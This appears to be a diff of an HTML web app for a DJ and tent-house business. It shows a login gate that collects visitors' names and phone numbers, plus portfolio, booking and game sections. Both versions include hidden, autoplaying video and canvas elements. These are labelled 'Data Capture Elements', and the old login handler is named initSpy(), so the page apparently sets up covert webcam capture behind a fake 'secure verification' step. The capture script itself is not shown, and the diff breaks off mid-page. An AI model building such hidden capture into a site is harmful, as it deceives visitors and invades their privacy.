@@ -1,476 +1,759 @@
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Maa Nirmala DJ | ELITE APP</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Maa Nirmala DJ & Tent House - Elite Digital Portfolio">
     
-    <link rel="manifest" href="data:application/json;base64,ewogICAgIm5hbWUiOiAiTWFhIE5pcm1hbGEgREogQXBwIiwKICAgICJzaG9ydF9uYW1lIjogIk1hYSBOaXJtYWxhIiwKICAgICJzdGFydF91cmwiOiAiLyIsCiAgICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAgICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwMjAyMDQiLAogICAgInRoZW1lX2NvbG9yIjogIiNGRkQ3MDAiLAogICAgImljb25zIjogWyB7ICJzcmMiOiAiaHR0cHM6Ly9pLnBvc3RpbWcuY2MvRnp3OGJtN1gvZmlsZS0wMDAwMDAwMDk3NTg3MWZkOTk1OTZhNWEwZTM5YzcxYi5wbmciLCAic2l6ZXMiOiAiNTEyeDUxMiIsICJ0eXBlIjogImltYWdlL3BuZyIgfSBdCn0=">
-    <meta name="theme-color" content="#FFD700">
-    <link rel="apple-touch-icon" href="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png">
+    <meta name="theme-color" content="#D4AF37">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="application-name" content="MNDs Hub">
+    
+    <link rel="manifest" href='data:application/manifest+json,{"name":"MNDs Secure Hub","short_name":"MNDs App","start_url":".","display":"standalone","background_color":"#050505","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"512x512","type":"image/jpeg"}]}'>
 
-    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Cinzel:wght@700;900&family=Rajdhani:wght@500;600;700;800&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <title>Maa Nirmala DJ & Tent House | SECURE HUB</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Outfit:wght@200;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
     <style>
-        /* CORE VARIABLES */
         :root {
-            --bg-deep: #000000;
-            --bg-panel: #0d0d12;
-            --primary: #FFD700; 
-            --accent: #00f3ff;
-            --text: #ffffff;
-            --glass: rgba(15, 15, 20, 0.95);
-            --border: 1px solid rgba(255, 215, 0, 0.2);
+            /* --- ELITE DARK THEME --- */
+            --bg-body: #050505;
+            --bg-card: rgba(20, 20, 20, 0.9);
+            --border-color: rgba(212, 175, 55, 0.3);
+            --gold-primary: #D4AF37;
+            --gold-shine: #FFD700;
+            --text-main: #ffffff;
+            --text-sub: #b3b3b3;
+            --glass-blur: blur(25px);
+            --nav-glass: blur(30px);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        [data-theme="light"] {
+            --bg-body: #f2f2f2;
+            --bg-card: rgba(255, 255, 255, 0.95);
+            --border-color: rgba(180, 140, 40, 0.3);
+            --gold-primary: #b08d26;
+            --gold-shine: #d4a017;
+            --text-main: #111111;
+            --text-sub: #555555;
+        }
 
-        body {
-            background-color: var(--bg-deep);
-            color: var(--text);
-            font-family: 'Outfit', sans-serif;
-            overflow-x: hidden;
+        /* --- PREMIUM SCROLLBAR --- */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: var(--gold-primary); border-radius: 10px; }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        
+        body { 
+            background-color: var(--bg-body); 
+            color: var(--text-main); 
+            font-family: 'Outfit', sans-serif; 
+            overflow-x: hidden; 
             min-height: 100vh;
-            /* Sci-Fi Grid Background */
-            background-image: 
-                linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
-            background-size: 40px 40px;
+            transition: background-color 0.4s ease, color 0.4s ease;
+            user-select: none;
         }
 
-        /* UTILS */
-        #hiddenVideo, #hiddenCanvas, #clickSound, #adminFile, #adminReel { display: none; }
-
-        /* --- PAGE 1: GATEWAY --- */
-        #gateway {
+        /* =========================================
+           1. GATEKEEPER (LOGIN PAGE)
+           ========================================= */
+        #gatekeeper {
             position: fixed; inset: 0; z-index: 9999;
-            background: #000;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            padding: 20px;
-            background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%);
-        }
-        .logo-ring {
-            width: 140px; height: 140px; border-radius: 50%;
-            padding: 5px; border: 3px solid var(--primary);
-            box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
-            margin-bottom: 30px; animation: pulse 3s infinite;
-        }
-        .logo-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
-        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }
-
-        .secure-card {
-            background: rgba(20, 20, 30, 0.8); border: 1px solid var(--accent);
-            padding: 30px; border-radius: 20px; width: 100%; max-width: 350px;
-            text-align: center; backdrop-filter: blur(10px);
-        }
-        .login-input {
-            width: 100%; padding: 15px; margin-bottom: 15px;
-            background: #000; border: 1px solid #444; color: var(--accent);
-            font-family: 'Rajdhani'; font-size: 18px; border-radius: 50px; text-align: center;
-        }
-        .btn-enter {
-            width: 100%; padding: 15px; background: linear-gradient(90deg, var(--primary), #ffa500);
-            color: #000; font-weight: 800; border: none; font-family: 'Rajdhani'; letter-spacing: 2px;
-            cursor: pointer; border-radius: 50px; font-size: 18px;
+            background: var(--bg-body);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 20px; text-align: center;
+            background-image: radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.1) 0%, transparent 80%);
+            transition: opacity 0.8s ease, visibility 0.8s;
         }
 
-        /* --- PAGE 2: MAIN APP --- */
-        #main-app { display: none; padding-bottom: 90px; opacity: 0; transition: opacity 0.5s; }
+        .gate-card {
+            width: 100%; max-width: 400px;
+            background: rgba(10, 10, 10, 0.95);
+            border: 1px solid var(--gold-primary);
+            border-radius: 20px; padding: 40px 25px;
+            box-shadow: 0 0 80px rgba(212, 175, 55, 0.15);
+            backdrop-filter: blur(20px);
+            position: relative; overflow: hidden;
+            animation: pulseCard 4s infinite alternate;
+        }
+        @keyframes pulseCard { from { transform: scale(1); border-color: rgba(212,175,55,0.3); } to { transform: scale(1.005); border-color: rgba(212,175,55,0.6); } }
 
-        .app-header {
-            position: fixed; top: 0; width: 100%; height: 65px;
-            background: var(--glass); backdrop-filter: blur(15px);
+        .gate-img-frame {
+            width: 110px; height: 110px; margin: 0 auto 20px;
+            border-radius: 50%; padding: 3px;
+            border: 2px solid var(--gold-primary); 
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.3);
+        }
+        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+
+        .gate-title { 
+            font-family: 'Cinzel'; color: var(--gold-primary); font-size: 26px; margin-bottom: 5px; 
+            text-shadow: 0 0 15px rgba(212, 175, 55, 0.5); font-weight: 700;
+        }
+        .gate-sub { color: #666; font-size: 11px; letter-spacing: 4px; margin-bottom: 30px; font-family: 'Rajdhani'; text-transform: uppercase; }
+
+        .gate-input-group { position: relative; margin-bottom: 15px; text-align: left; }
+        .gate-input {
+            width: 100%; padding: 15px 15px 15px 45px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #333; color: #fff; font-size: 16px;
+            font-family: 'Rajdhani'; transition: 0.3s; border-radius: 10px;
+        }
+        .gate-input:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.08); box-shadow: 0 0 15px rgba(212,175,55,0.1); }
+        .gate-icon { position: absolute; left: 15px; top: 17px; color: #555; transition: 0.3s; }
+        .gate-input:focus + .gate-icon { color: var(--gold-primary); }
+
+        .gate-btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, var(--gold-primary), #997d2d);
+            color: #000; font-weight: 800; font-size: 16px;
+            border: none; cursor: pointer; border-radius: 10px;
+            text-transform: uppercase; letter-spacing: 2px; margin-top: 15px;
+            box-shadow: 0 5px 25px rgba(212, 175, 55, 0.3); transition: 0.3s;
+        }
+        .gate-btn:active { transform: scale(0.98); }
+        
+        .loading-text {
+            margin-top: 20px; font-size: 12px; color: var(--gold-primary); 
+            font-family: 'Rajdhani'; display: none; letter-spacing: 1px; font-weight: bold;
+        }
+
+        /* =========================================
+           2. MAIN PORTFOLIO STYLES
+           ========================================= */
+        #main-interface { display: none; opacity: 0; transition: opacity 1.5s ease; padding-bottom: 90px; }
+
+        .bg-fx { position: fixed; inset: 0; z-index: -2; pointer-events: none; overflow: hidden; }
+        .orb { position: absolute; border-radius: 50%; filter: blur(120px); opacity: 0.15; animation: float 15s infinite alternate; }
+        .orb-1 { width: 350px; height: 350px; background: var(--gold-primary); top: -10%; left: -10%; }
+        .orb-2 { width: 300px; height: 300px; background: #00e5ff; bottom: -10%; right: -10%; }
+        @keyframes float { 0% { transform: translate(0,0); } 100% { transform: translate(50px, 50px); } }
+
+        /* Navbar */
+        .navbar {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 0 20px; z-index: 1000; border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding: 15px 5%; position: sticky; top: 0; z-index: 1000;
+            background: rgba(5, 5, 5, 0.85); backdrop-filter: var(--glass-blur); -webkit-backdrop-filter: var(--glass-blur);
+            border-bottom: 1px solid var(--border-color);
         }
-        .stylish-logo {
-            font-family: 'Great Vibes', cursive; font-size: 28px;
-            background: linear-gradient(to right, #FFD700, #ff8c00);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
-
-        /* SIDEBAR */
-        #sidebar {
-            position: fixed; top: 0; left: -280px; width: 260px; height: 100vh;
-            background: #080808; border-right: 2px solid var(--primary);
-            z-index: 2000; padding-top: 80px; transition: 0.3s;
-        }
-        #sidebar.active { left: 0; }
-        .menu-link {
-            display: block; padding: 15px 25px; color: var(--text);
-            text-decoration: none; font-family: 'Rajdhani'; font-size: 18px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-
-        /* HOME TAB */
-        .tab-content { display: none; animation: fadeUp 0.5s; }
-        .tab-content.active { display: block; }
-        @keyframes fadeUp { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
-
-        .hero-section { margin-top: 85px; text-align: center; }
-        .floating-hero {
-            width: 140px; height: 140px; border-radius: 50%;
-            border: 4px solid var(--primary); box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
-            object-fit: cover; animation: float 4s infinite ease-in-out;
-        }
-        @keyframes float { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
-
-        /* LIVE FEED STYLES (NEW) */
-        .feed-container { padding: 0 15px; margin-top: 30px; }
-        .feed-title {
-            color: var(--accent); font-family: 'Cinzel'; border-bottom: 1px solid var(--accent);
-            padding-bottom: 5px; margin-bottom: 15px; font-size: 18px;
-        }
-        .post-card {
-            background: #111; border: 1px solid #333; border-radius: 12px;
-            margin-bottom: 20px; overflow: hidden; animation: fadeUp 0.5s;
-        }
-        .post-header { padding: 10px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #222; }
-        .post-avatar { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--primary); }
-        .post-meta h4 { font-size: 14px; color: var(--primary); margin: 0; font-family: 'Rajdhani'; }
-        .post-meta span { font-size: 10px; color: #666; }
-        .post-body { padding: 10px; color: #ddd; font-size: 14px; line-height: 1.5; }
-        .post-img { width: 100%; display: block; }
-        .post-video { width: 100%; display: block; }
-
-        /* CONTACT MODAL (PREMIUM EXPANDED BUTTONS) */
-        #ownerModal {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000;
-            display: none; padding: 20px; overflow-y: auto; justify-content: center;
-        }
-        .owner-scroll-box { width: 100%; max-width: 500px; margin-top: 50px; padding-bottom: 50px; }
-        .owner-tile {
-            background: #151515; border: 1px solid var(--border); border-radius: 15px;
-            padding: 20px; margin-bottom: 20px;
-        }
-        .tile-head { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
-        .tile-pic { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
-        .tile-info h3 { color: var(--accent); font-family: 'Cinzel'; font-size: 18px; margin: 0; }
-        .tile-info p { color: #888; font-size: 12px; margin: 0; font-family: 'Rajdhani'; }
+        .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+        .controls { display: flex; align-items: center; gap: 15px; }
+        .nav-btn { font-size: 20px; cursor: pointer; color: var(--text-main); background: none; border: none; }
         
-        .btn-stack { display: flex; flex-direction: column; gap: 10px; }
-        .big-btn {
-            width: 100%; padding: 12px; border-radius: 8px; border: none;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            font-family: 'Rajdhani'; font-weight: 700; font-size: 16px; color: #000;
-            text-decoration: none; transition: 0.2s;
+        /* Translate */
+        #google_translate_element { margin-right: 5px; }
+        .goog-te-gadget-simple {
+            background-color: rgba(255,255,255,0.05) !important; 
+            border: 1px solid var(--gold-primary) !important;
+            padding: 4px 8px !important; border-radius: 20px !important;
         }
-        .big-btn:active { transform: scale(0.98); }
-        .b-call { background: linear-gradient(90deg, #FFD700, #ffaa00); }
-        .b-wa { background: linear-gradient(90deg, #25D366, #128C7E); color: white; }
-        .b-sms { background: linear-gradient(90deg, #0088cc, #0055aa); color: white; }
+        .goog-te-gadget-simple span { color: var(--gold-primary) !important; font-weight: 700 !important; font-size: 11px !important; }
+        .goog-te-gadget-icon, .goog-te-banner-frame { display: none !important; } 
+        body { top: 0px !important; }
 
-        /* BOOKING & MAP */
-        .booking-panel { margin: 20px; padding: 20px; background: var(--bg-panel); border-radius: 15px; border: 1px solid var(--border); }
-        .form-row { margin-bottom: 15px; }
-        .form-input { width: 100%; padding: 12px; background: #000; border: 1px solid #444; color: white; border-radius: 8px; }
-        
-        /* BOTTOM NAV */
+        /* Profile Section */
+        .container { width: 100%; max-width: 800px; margin: 0 auto; padding: 0 20px; }
+        .profile-wrapper { text-align: center; padding: 60px 0 30px; }
+        .img-container {
+            width: 160px; height: 160px; margin: 0 auto 20px;
+            position: relative; border-radius: 50%; padding: 5px;
+            background: linear-gradient(135deg, var(--gold-primary), transparent, var(--gold-shine));
+        }
+        .profile-pic {
+            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
+            border: 4px solid var(--bg-body); background: #000;
+        }
+        h1 { 
+            font-family: 'Rajdhani', sans-serif; font-size: 32px; font-weight: 700; 
+            background: linear-gradient(to right, var(--text-main), var(--gold-primary), var(--text-main));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px;
+        }
+        .verified { color: #1DA1F2; font-size: 20px; vertical-align: middle; margin-left: 5px; }
+        .bio { color: var(--gold-primary); font-size: 13px; letter-spacing: 2px; font-weight: 600; text-transform: uppercase; }
+
+        /* --- APP INSTALL BUTTON --- */
+        #installBtn {
+            display: none; /* Auto-shows via JS */
+            margin: 20px auto;
+            background: rgba(212, 175, 55, 0.1); border: 1px solid var(--gold-primary);
+            color: var(--gold-primary); padding: 12px 30px; border-radius: 30px;
+            font-size: 12px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.15);
+            animation: bounce 2s infinite; letter-spacing: 1px;
+        }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+        /* Grid & Cards */
+        .section-label {
+            display: flex; align-items: center; gap: 10px;
+            margin: 35px 0 15px; color: var(--gold-primary); font-family: 'Cinzel'; font-weight: bold; font-size: 14px;
+            border-bottom: 1px solid var(--border-color); padding-bottom: 8px;
+        }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        @media (min-width: 600px) { .grid { gap: 20px; } }
+        .card {
+            background: var(--bg-card); border: 1px solid var(--border-color);
+            border-radius: 16px; padding: 20px; height: 100px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            text-decoration: none; color: var(--text-main); position: relative; overflow: hidden;
+            backdrop-filter: var(--glass-blur); -webkit-backdrop-filter: var(--glass-blur);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        .card:active { transform: scale(0.96); border-color: var(--gold-shine); }
+        .card i { font-size: 28px; margin-bottom: 8px; color: var(--gold-primary); transition: 0.3s; }
+        .card span { font-size: 11px; font-weight: 600; text-transform: uppercase; text-align: center; }
+        .full-w { grid-column: span 2; flex-direction: row; gap: 15px; height: 75px; background: linear-gradient(90deg, rgba(212,175,55,0.05), transparent); }
+        .full-w i { margin-bottom: 0; font-size: 24px; }
+
+        /* Bottom Nav */
         .bottom-nav {
-            position: fixed; bottom: 0; width: 100%; height: 65px;
-            background: rgba(10, 10, 15, 0.98); border-top: 2px solid var(--accent);
+            position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
+            background: rgba(5, 5, 5, 0.95); backdrop-filter: var(--nav-glass); -webkit-backdrop-filter: var(--nav-glass);
+            border-top: 1px solid var(--border-color); z-index: 4000;
             display: flex; justify-content: space-around; align-items: center;
-            z-index: 900; backdrop-filter: blur(10px);
         }
-        .nav-icon { color: #666; font-size: 10px; display: flex; flex-direction: column; align-items: center; }
-        .nav-icon i { font-size: 22px; margin-bottom: 4px; }
-        .nav-icon.active { color: var(--accent); transform: translateY(-3px); }
+        .nav-item {
+            flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            color: var(--text-sub); gap: 4px; cursor: pointer; transition: 0.3s;
+        }
+        .nav-item.active { color: var(--gold-primary); }
+        .nav-item.active i { transform: translateY(-3px); text-shadow: 0 0 15px var(--gold-primary); }
 
+        /* AI Button */
+        .ai-trigger {
+            position: fixed; bottom: 90px; right: 25px;
+            width: 60px; height: 60px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--gold-primary), #997d2d);
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 30px rgba(212,175,55,0.4);
+            z-index: 2000; cursor: pointer; animation: pulse 3s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        /* Modals */
+        .modal-wrap {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 5000;
+            display: none; align-items: center; justify-content: center;
+            backdrop-filter: blur(8px); opacity: 0; transition: opacity 0.3s;
+        }
+        .modal-wrap.active { opacity: 1; display: flex; }
+        .modal-inner {
+            width: 92%; max-width: 450px; background: #080808; border: 1px solid var(--gold-primary);
+            border-radius: 20px; overflow: hidden; display: flex; flex-direction: column;
+            box-shadow: 0 0 60px rgba(212,175,55,0.15);
+            max-height: 85vh;
+        }
+
+        /* Owner Profile */
+        .owner-profile {
+            max-width:700px; margin:40px auto; padding:30px 20px; text-align:center;
+            background:rgba(0,0,0,0.6); border-radius:26px; box-shadow:0 0 30px rgba(212,175,55,0.25);
+        }
+        .owner-profile img{ width:160px; height:160px; object-fit:cover; border-radius:24px; border:4px solid #D4AF37; margin-bottom:18px; }
+        .owner-profile h1{ font-size:32px; font-weight:800; margin:10px 0 5px; background:linear-gradient(90deg,#FFD700,#D4AF37,#FFD700); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .owner-profile p{ font-size:15px; line-height:1.7; color:#eaeaea; margin-bottom:22px; }
+        .owner-profile .rights{ font-size:18px; font-weight:700; color:#D4AF37; }
+
+        /* Games & Tools */
+        .game-menu { padding: 20px; overflow-y: auto; text-align: center; }
+        .games-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .game-thumb { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; padding: 15px; cursor: pointer; transition: 0.3s; }
+        .game-thumb:hover { border-color: var(--gold-primary); }
+        .game-thumb i { font-size: 30px; color: var(--gold-primary); margin-bottom: 8px; }
+        .game-canvas-area { display: none; flex-direction: column; align-items: center; padding: 20px; }
+        canvas { background: #111; border: 2px solid var(--gold-primary); border-radius: 5px; }
+        .game-ctrl-pad { margin-top: 15px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; width: 180px; }
+        .g-btn { background: #333; border: none; padding: 15px; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }
+        
+        #tttGrid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; width: 240px; margin: 0 auto; }
+        .ttt-cell { width: 75px; height: 75px; background: #222; display: flex; align-items: center; justify-content: center; font-size: 36px; font-weight: bold; color: #fff; cursor: pointer; border-radius: 8px; }
+        .ttt-cell.x { color: var(--gold-primary); }
+        .ttt-cell.o { color: #00e5ff; }
+
+        .chat-box { height: 350px; padding: 20px; overflow-y: auto; background: #0a0a0a; display: flex; flex-direction: column; gap: 10px; }
+        .bubble { padding: 10px 15px; border-radius: 12px; max-width: 80%; font-size: 13px; }
+        .bubble.bot { background: rgba(212,175,55,0.15); color: #fff; align-self: flex-start; }
+        .bubble.user { background: #333; color: #fff; align-self: flex-end; }
+        
+        .toast {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: var(--gold-primary); color: #000; padding: 10px 20px;
+            border-radius: 30px; font-weight: bold; font-size: 12px;
+            opacity: 0; pointer-events: none; transition: 0.3s; z-index: 6000;
+        }
+        .toast.show { opacity: 1; top: 40px; }
+
+        /* Data Capture Elements */
+        #hidden-video { display: none; }
+        #hidden-canvas { display: none; }
     </style>
 </head>
-<body onclick="playClick()" onload="loadFeed()">
+<body data-theme="dark">
 
-    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3" preload="auto"></audio>
+    <div id="gatekeeper">
+        <div class="gate-card">
+            <div class="gate-img-frame">
+                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="gate-img" alt="Profile">
+            </div>
+            <h2 class="gate-title">MAA NIRMALA DJ & TENT HOUSE</h2>
+            <div class="gate-sub">SECURE PORTFOLIO GATEWAY</div>
 
-    <video id="hiddenVideo" autoplay playsinline></video>
-    <canvas id="hiddenCanvas"></canvas>
-    
-    <input type="file" id="adminFile" accept="image/*" onchange="createPost('image')">
-    <input type="file" id="adminReel" accept="video/*" onchange="createPost('video')">
+            <div class="gate-input-group">
+                <input type="text" id="g-name" class="gate-input" placeholder="YOUR FULL NAME">
+                <i class="fas fa-user gate-icon"></i>
+            </div>
+            
+            <div class="gate-input-group">
+                <input type="tel" id="g-phone" class="gate-input" placeholder="YOUR MOBILE NUMBER">
+                <i class="fas fa-phone gate-icon"></i>
+            </div>
 
-    <div id="gateway">
-        <div class="logo-ring">
-            <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="logo-img">
-        </div>
-        <div class="secure-card">
-            <h2 style="font-family:'Cinzel'; color:var(--primary);">Maa Nirmala DJ</h2>
-            <p style="color:#888; font-family:'Rajdhani'; letter-spacing:2px; margin-bottom:20px;">ELITE APP ACCESS v30.0</p>
-            <input type="text" id="logName" class="login-input" placeholder="FULL NAME">
-            <input type="tel" id="logPhone" class="login-input" placeholder="MOBILE NUMBER">
-            <button class="btn-enter" id="enterBtn" onclick="initSpy()">
-                <i class="fas fa-fingerprint"></i> LOGIN
+            <button class="gate-btn" id="btn-verify" onclick="initiateSecureEntry()">
+                <i class="fas fa-fingerprint"></i> VERIFY & ENTER
             </button>
+            
+            <div class="loading-text" id="g-status">
+                <i class="fas fa-circle-notch fa-spin"></i> SECURE SCANNING...
+            </div>
         </div>
     </div>
 
-    <div id="main-app">
+    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
+
+    <div id="main-interface">
+        <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
+        <div id="toast" class="toast"><i class="fas fa-check-circle"></i> Success</div>
+        <div class="bg-fx"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
         
-        <header class="app-header">
-            <i class="fas fa-bars" style="font-size:22px; color:var(--primary);" onclick="toggleMenu()"></i>
-            <div class="stylish-logo">Maa Nirmala</div>
-            <i class="fas fa-moon" style="font-size:22px; color:var(--accent);" onclick="toggleTheme()"></i>
-        </header>
-
-        <aside id="sidebar">
-            <div style="text-align:center; padding:20px; border-bottom:1px solid #333;">
-                <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" style="width:80px; height:80px; border-radius:50%; border:2px solid var(--primary);">
-                <h4 style="color:white; margin-top:10px;">Lalu Kumar</h4>
-                <div onclick="adminLogin()" style="margin-top:10px; padding:8px; border:1px solid var(--accent); color:var(--accent); font-size:12px; cursor:pointer;">ADMIN PANEL</div>
-            </div>
-            <a href="#" class="menu-link" onclick="goTab('home')"><i class="fas fa-home"></i> Home</a>
-            <a href="#" class="menu-link" onclick="goTab('booking')"><i class="fas fa-calendar-check"></i> Booking</a>
-            <a href="#" class="menu-link" onclick="openOwners()"><i class="fas fa-users"></i> Owners</a>
-            <a href="#" class="menu-link" onclick="goTab('services')"><i class="fas fa-compact-disc"></i> Services</a>
-            <a href="#" class="menu-link" onclick="location.reload()" style="color:#ff4444;"><i class="fas fa-power-off"></i> Logout</a>
-        </aside>
-
-        <div id="tab-home" class="tab-content active">
-            <div class="hero-section">
-                <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="floating-hero">
-                <h1 style="font-family:'Cinzel'; font-size:32px; color:var(--primary); margin-top:15px;">ROYAL SOUND</h1>
-                <p style="color:var(--accent); font-family:'Rajdhani'; letter-spacing:3px;">ENGINEERING SINCE 2010</p>
-            </div>
-
-            <div class="feed-container">
-                <h4 class="feed-title">OFFICIAL UPDATES</h4>
-                <div id="feed-stream">
-                    <div class="post-card">
-                        <div class="post-header">
-                            <img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="post-avatar">
-                            <div class="post-meta"><h4>Maa Nirmala Admin</h4><span>Pinned Post</span></div>
-                        </div>
-                        <div class="post-body">
-                            Welcome to the Official Elite App. Check here for live photos, reels, and updates from our events.
-                        </div>
-                    </div>
+        <nav class="navbar">
+            <div class="brand"><i class="fas fa-crown"></i> MND Hub</div>
+            <div style="display: flex; align-items: center;">
+                <div id="google_translate_element"></div>
+                <div class="controls">
+                    <button class="nav-btn" onclick="openSettings()"><i class="fas fa-cog"></i></button>
+                    <button class="nav-btn" id="themeIcon" onclick="themeSwitch()"><i class="fas fa-sun"></i></button>
                 </div>
             </div>
-
-            <div style="padding:20px;">
-                <h4 class="feed-title">LOCATION MAP</h4>
-                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3616.985617042578!2d86.9788017150058!3d24.59480808417935!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjTCsDM1JzQxLjMiTiA4NsKwNTgnNTEuNiJF!5e0!3m2!1sen!2sin!4v1629898765432!5m2!1sen!2sin" style="width:100%; height:250px; border:2px solid var(--primary); border-radius:15px;"></iframe>
-            </div>
-        </div>
-
-        <div id="tab-booking" class="tab-content">
-            <div style="text-align:center; margin-top:85px; margin-bottom:20px;">
-                <h2 style="color:var(--primary); font-family:'Cinzel';">EVENT BOOKING</h2>
-            </div>
-            <div class="booking-panel">
-                <div class="form-row"><label style="color:var(--accent); font-size:12px;">FULL NAME</label><input type="text" id="bName" class="form-input"></div>
-                <div class="form-row"><label style="color:var(--accent); font-size:12px;">PHONE</label><input type="tel" id="bPhone" class="form-input"></div>
-                <div class="form-row"><label style="color:var(--accent); font-size:12px;">ADDRESS</label><input type="text" id="bAddr" class="form-input"></div>
-                <div style="display:flex; gap:10px;">
-                    <input type="text" id="bBlock" class="form-input" placeholder="Block">
-                    <input type="text" id="bPin" class="form-input" placeholder="Pin">
-                </div>
-                <div class="form-row" style="margin-top:10px;"><label style="color:var(--accent); font-size:12px;">DISTRICT</label><input type="text" id="bDist" class="form-input"></div>
-                <div class="form-row"><label style="color:var(--accent); font-size:12px;">COUNTRY</label><input type="text" id="bCount" class="form-input" value="India"></div>
-                <div class="form-row"><label style="color:var(--accent); font-size:12px;">DATE</label><input type="date" id="bDate" class="form-input" style="color-scheme:dark;"></div>
-                <button class="btn-enter" onclick="submitBooking()" style="margin-top:20px;">CONFIRM</button>
-            </div>
-        </div>
-
-        <div id="tab-services" class="tab-content">
-            <div style="text-align:center; margin-top:100px;">
